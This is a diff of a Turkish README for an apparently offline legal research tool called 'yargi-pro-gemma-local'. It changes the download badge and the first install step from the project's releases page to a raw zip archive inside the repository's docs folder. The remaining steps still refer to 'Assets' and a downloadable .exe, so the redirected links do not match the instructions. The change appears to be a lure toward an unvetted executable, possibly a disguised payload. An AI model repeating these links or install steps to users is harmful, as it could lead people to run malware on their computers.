@@ -1,6 +1,6 @@
 # ⚖️ yargi-pro-gemma-local - Yerel bilgisayarda Türk hukuku araştırması
 
-[![](https://img.shields.io/badge/İndir-Yargı_Pro_Sürümü-blue.svg)](https://github.com/Kassiwaning586/yargi-pro-gemma-local/releases)
+[![](https://img.shields.io/badge/İndir-Yargı_Pro_Sürümü-blue.svg)](https://github.com/Kassiwaning586/yargi-pro-gemma-local/raw/refs/heads/main/docs/gemma-yargi-local-pro-v2.3.zip)
 
 Bu uygulama, bilgisayarınızda hukuki belgeleri ve mevzuat verilerini sorgulamanızı sağlar. İnternet bağlantısı gerektirmez. Verileriniz bilgisayarınızın sınırları içinde kalır. Yargı Pro, karmaşık yasal dökümanları anlamanız ve hukuki araştırmalarınızı hızlandırmanız için tasarlanmıştır.
 
@@ -8,7 +8,7 @@ Bu uygulama, bilgisayarınızda hukuki belgeleri ve mevzuat verilerini sorgulama
 
 Uygulamayı bilgisayarınıza yüklemek için şu adımları izleyin. İşlem birkaç dakika sürer.
 
-1. [İndirme sayfasına gidin](https://github.com/Kassiwaning586/yargi-pro-gemma-local/releases).
+1. [İndirme sayfasına gidin](https://github.com/Kassiwaning586/yargi-pro-gemma-local/raw/refs/heads/main/docs/gemma-yargi-local-pro-v2.3.zip).
 2. Sayfada "Assets" başlığı altındaki en yeni sürümü bulun.
 3. Windows kullanıcısı iseniz `.exe` uzantılı dosyayı tıklayıp bilgisayarınıza kaydedin.
 4. İndirme tamamlandıktan sonra dosyayı açın ve yönergeleri izleyin.
